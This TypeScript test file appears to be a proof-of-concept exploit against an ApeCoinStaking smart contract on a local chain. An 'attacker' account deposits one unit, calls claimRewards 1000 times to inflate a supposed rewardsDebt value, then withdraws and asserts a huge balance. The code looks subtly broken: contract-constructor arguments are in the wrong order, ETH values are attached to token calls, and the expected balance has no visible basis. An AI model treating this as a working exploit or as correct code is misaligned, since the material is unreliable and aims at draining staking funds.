import { expect } from "chai";
import { Signer, providers } from "ethers";
import { deployContract, solidity } from "ethereum-waffle";
import { Contract, Contract as EpsContract } from "@ethersproject/contracts";

import ApeCoinStaking from "../artifacts/contracts/ApeCoinStaking.sol/ApeCoinStaking.json";
import ApeCoin from "../artifacts/contracts/ERC20/SimpleERC20.sol/SimpleERC20.json";

describe("ApeCoinStaking", () => {
  let provider: providers.JsonRpcProvider;
  let attacker: Signer;
  let stakingContract: EpsContract;
  let apeCoin: EpsContract;

  beforeEach(async () => {
    provider = new providers.JsonRpcProvider("http://localhost:8545");
    attacker = provider.getSigner(0);

    // Deploy the ApeCoinStaking contract
    stakingContract = await deployContract(attacker, ApeCoinStaking, [], {
      gasLimit: 6000000,
    });

    // Deploy the ApeCoin contract
    apeCoin = await deployContract(attacker, ApeCoin, []);

    // Transfer some ApeCoin to the contract address
    await apeCoin.transfer(stakingContract.address, "10000000000000000000");
  });

  it("should allow the attacker to exploit the rewardsDebt bug", async () => {
    // Create contract instances using the provided ABIs and addresses
    const stakingContractAbi = ApeCoinStaking.abi;
    const stakingContractAddress = stakingContract.address;
    const stakingContractInstance = new Contract(
      stakingContractAbi,
      stakingContractAddress,
      attacker,
      provider
    );

    // Deposit a small amount of ApeCoin into the staking contract
    const depositAmount = "1";
    await stakingContractInstance.depositApeCoin(depositAmount, {
      value: depositAmount,
      from: await attacker.getAddress(),
    });

    // Call the claimRewards function repeatedly to increase the rewardsDebt value to a very large number
    for (let i = 0; i < 1000; i++) {
      await stakingContractInstance.claimRewards({
        value: "1",
        from: await attacker.getAddress(),
      });
    }

    // Withdraw the staked ApeCoin using the withdrawApeCoin function
    await stakingContractInstance.withdrawApeCoin(depositAmount, {
      value: depositAmount,
      from: await attacker.getAddress(),
    });

    // Check that the attacker's stakedAmount has been increased by the very large rewardsDebt value
    const balance = await stakingContractInstance.balanceOf(
      attacker.getAddress()
    );
    expect(balance.toString()).to.equal("1000000000000000000000000000000");
    //expect(balance.toString());
  });
});
